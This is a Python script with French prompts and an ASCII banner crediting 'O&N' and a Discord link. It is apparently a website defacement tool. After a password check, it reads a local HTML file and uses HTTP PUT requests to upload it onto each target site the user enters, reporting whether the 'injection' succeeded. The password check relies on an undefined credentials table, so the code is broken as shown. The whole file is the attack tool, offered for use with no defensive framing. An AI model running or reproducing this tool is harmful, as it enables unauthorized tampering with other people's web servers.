import hashlib
import getpass
import requests
import os.path
import sys
import os
import random

try:
    import requests
    import os.path
    import sys
    import os
    import random
except ImportError:
    exit("install requests and try again ...")
os.system("clear")

red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"

colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]

color1, color2, color3, color4, color5 = random.sample(colors, 5)

banner = f"""
\033[32m                                 .----------------.  .----------------.  .----------------.
                                | .--------------. || .--------------. || .--------------. |
                                | |     ____     | || |    ___       | || | ____  _____  | |
                                | |   .'    `.   | || |  .' _ '.     | || ||_   \|_   _| | |
                                | |  /  .--.  \  | || |  | (_) '___  | || |  |   \ | |   | |
                                | |  | |    | |  | || |  .`___'/ _/  | || |  | |\ \| |   | |
                                | |  \  `--'  /  | || | | (___)  \_  | || | _| |_\   |_  | |
                                | |   `.____.'   | || | `._____.\__| | || ||_____|\____| | |
                                | |              | || |              | || |              | |
                                | '--------------' || '--------------' || '--------------' |
                                 '----------------'  '----------------'  '----------------' 
                    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\t
                    \033[33m                                                 [♥\]Createur du Tool : O&N
                                         [♥\]Discord : https://discord.gg/teHyE9Tgq7\t
                    \033[32m                                    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \t"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
    ipt = input(tetew)
    return str(ipt)

def aox(script, target_url):
    op = open(script, "r").read()
    s = requests.Session()
    try:
        site = target_url.strip()
        if not site.startswith("http://"):
            site = "http://" + site
        req = s.put(site + "/" + script, data=op)
        if req.status_code > 200 or req.status_code >= 250:
            print(m + ">" + b + "[-] le script n a pas pu etre injecter..." + b + " %s/%s" % (site, script))
        else:
            print(m + ">" + h + "[+] le script a ete injecter..." + h + " %s/%s" % (site, script))
    except requests.exceptions.RequestException:
        print(m + ">" + b + "[-] le script n a pas pu etre injecter..." + b + " %s" % target_url)

def main(__bn__):
    print(__bn__)
    
    authenticated = False
    while not authenticated:
        username = input("\033[33mEntrez votre pseudonyme: ")
        password = getpass.getpass("\033[33mEntrez votre mot de passe: ")

        if username in valid_credentials and hashlib.md5(password.encode()).hexdigest() == valid_credentials[username]:
            authenticated = True
        else:
            print("\033[31mVos information sont pas valide. Accès refusez.")
    
    while True:
        try:
            a = x(f"\033[33mEntrez le nom de votre fichier [fichier.html]: ")
            if not os.path.isfile(a):
                print("Le fichier ['%s'] est invalide ou le format du fichiez n'est pas valide." % a)
                continue
            else:
                break
        except KeyboardInterrupt:
            print()
            exit()

    while True:
        target_url = x(f"\033[33mEntrez le nom du fichier (ou inserez 'q'): ")
        if target_url.lower() == 'q':
            break
        aox(a, target_url)
   
if __name__ == "__main__":
    main(banner)
